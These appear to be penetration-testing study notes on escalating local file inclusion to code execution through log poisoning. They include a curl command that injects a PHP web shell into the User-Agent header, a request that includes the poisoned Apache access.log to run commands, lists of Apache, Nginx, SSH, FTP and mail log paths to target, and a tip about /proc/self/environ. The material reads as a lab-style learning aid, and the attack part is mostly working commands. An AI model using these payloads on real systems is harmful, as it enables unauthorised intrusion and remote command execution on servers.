
Both `Apache` and `Nginx` maintain various log files, such as `access.log` and `error.log`. The `access.log` file contains various information about all requests made to the server, including each request's `User-Agent` header. As we can control the `User-Agent` header in our requests, we can use it to poison the server logs as we did above.

The path taken in this not can also be applied to ssh,ftp,mail
	E.g
		Send malicious mail document with php and use LFI to execute on the saved mail file

Log File List
	/var/log/apache2/error.log
	/var/log/apache2/access.log
	/var/log/sshd.log
	/var/log/mail
	/var/log/vsftpd.log

Log File Paths(Might have different paths use this [LFI FUZZ](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI))
	Default
		Apache
			 `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows
		Nginx
			`/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows

Testing for log file include(Look for parameters we control)
```http
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

(Control the User-Agent with burp suite or curl)
```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

Execute on user-agent web shell
```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id"
```
**Tip:** The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.


